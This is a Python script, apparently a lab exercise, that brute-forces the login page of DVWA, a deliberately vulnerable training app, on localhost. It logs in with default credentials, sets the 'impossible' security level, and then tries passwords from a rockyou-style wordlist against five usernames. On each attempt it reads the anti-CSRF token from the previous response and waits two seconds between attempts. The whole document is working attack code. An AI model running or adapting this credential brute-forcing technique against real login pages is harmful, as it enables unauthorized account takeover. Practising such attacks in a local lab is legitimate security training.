import requests
import re
import time

localhost = "localhost"
DVWA_URL = f"http://{localhost}/DVWA"
PASS_FILE = "test_rockyou.txt"
USER_LIST = ["admin", "gordonb", "pablo", "1337", "smithy"]

session = requests.Session()

def get_token(content):
    """Trích xuất user_token từ HTML"""
    match = re.search(r"name='user_token' value='([a-f0-9]+)'", content)
    return match.group(1) if match else None

def login():
    """Đăng nhập khởi tạo session"""
    res = session.get(f"{DVWA_URL}/login.php")
    token = get_token(res.text)
    login_data = {"username": "admin", "password": "password", "Login": "Login", "user_token": token}
    res = session.post(f"{DVWA_URL}/login.php", data=login_data)
    return "You have logged in" in res.text

def brute_force_impossible():
    base_url = f"{DVWA_URL}/vulnerabilities/brute/"
    
    res = session.get(base_url)
    current_token = get_token(res.text)

    for user in USER_LIST:
        with open(PASS_FILE, "r", encoding="utf-8", errors="ignore") as f:
            for password in f:
                password = password.strip()
                if not password: continue

                post_data = {
                    "username": user,
                    "password": password,
                    "Login": "Login",
                    "user_token": current_token
                }

                res = session.post(base_url, data=post_data)
                
                current_token = get_token(res.text)

                if "Welcome to the password protected area" in res.text:
                    print(f"[!] Successfully: {user} | {password}")
                    break
                
                
                time.sleep(2)

if __name__ == "__main__":
    if login():
        session.cookies.set("security", "impossible", domain=localhost)
        brute_force_impossible()